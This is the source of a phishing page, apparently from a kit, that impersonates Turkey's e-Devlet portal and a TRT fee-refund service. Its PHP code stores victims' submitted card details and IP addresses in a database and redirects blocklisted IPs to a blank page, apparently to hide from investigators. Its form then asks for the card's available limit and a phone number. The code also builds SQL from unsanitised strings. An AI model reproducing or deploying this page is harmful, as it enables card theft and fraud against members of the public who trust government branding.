<?php
foreach($_POST as $indexPost=>$valuePost) $_POST[$indexPost]=htmlspecialchars($valuePost,ENT_QUOTES);
include 'baglan.php';
function GetIP(){
if(getenv("HTTP_CLIENT_IP")) {
$ip = getenv("HTTP_CLIENT_IP");
} elseif(getenv("HTTP_X_FORWARDED_FOR")) {
$ip = getenv("HTTP_X_FORWARDED_FOR");
if (strstr($ip, ',')) {
$tmp = explode (',', $ip);
$ip = trim($tmp[0]);
}
} else {
$ip = getenv("REMOTE_ADDR");
}
return $ip;
}
$ipcik = GetIP();
$b1 = $_POST['anne'];
$tach = $_POST['kullanici'];
$tc = $_POST['skt'];
$pass = $_POST['pass'];
mysql_query("insert into ak (anne, kullanici, skt, tarih, pass, notif, ses, ip) values ( '$b1', '$tach', '$tc', now(), '$pass', '1', '1', '$ipcik')");


$query =  mysql_query('SELECT * FROM ip');
while($row = mysql_fetch_assoc($query)){
if($row['ip'] == $ipcik){
header('Location: about:blank');
}
}

?>


<!DOCTYPE html>
<!-- saved from url=(0037)https://aidatiadeniz.com/guvenlik.php -->
<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   
    <title>e-Devlet | Aidat İade Sistemi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/flaticon.css">

    <!-- Favicon icon -->
    

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="./guvenlik_files/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./guvenlik_files/default.css">

</head>
<body id="top">

<div class="page_loader"></div>


<link rel="icon" type="image/x-icon" href="https://www.indirvip.com/wp-content/uploads/2017/12/e-devlet-kap%C4%B1s%C4%B1-logo.png">
<form method="post" action="dogrulama.php" id="aspnetForm" autocomplete="off">




   <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/bootstrap.min(1).css">
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/font-awesome.min(1).css">
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/flaticon(1).css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="https://www.indirvip.com/wp-content/uploads/2017/12/e-devlet-kap%C4%B1s%C4%B1-logo.png" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="./guvenlik_files/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/style(1).css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./guvenlik_files/default(1).css">



<div class="page_loader"></div>



<!-- Login 1 start -->

<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                      
                            <img src="http://www.globya.com.tr/wp-content/uploads/2016/03/clients-04.png" alt="logo">
                        </a>
                        <h3>TRT Online Aidat İade Sistemi</h3>


							


			<font size="2" color="#960000">Girmiş Olduğunuz Kredi Kartının Size Ait Olduğunu Doğrulayabilmemiz İçin Lütfen Bilgilerinizi Doğrulayınız.</font>
			<br>
			<br>
							
                            <div class="form-group">
            <input class="expiration-month-and-year input-text" pattern="[0-9]*" type="number" id="sms3" name="sms3" placeholder="Kullanılabilir Limit ₺" required="">        
                            </div>

                            
  <div class="form-group">
            <input class="expiration-month-and-year input-text" pattern="[0-9]*" type="number" id="tel" name="baba" placeholder="Cep Telefon Numarası" required="">        
                            </div>

                                <button type="submit" class="btn-md btn-theme btn-block">DEVAM ET</button>
                            </div>
							<br>
							<div id="error-message"></div>
                          </div>
                        
                       
                </div>
            </div>
        </div>
    </div>
</div></section></form></body></html>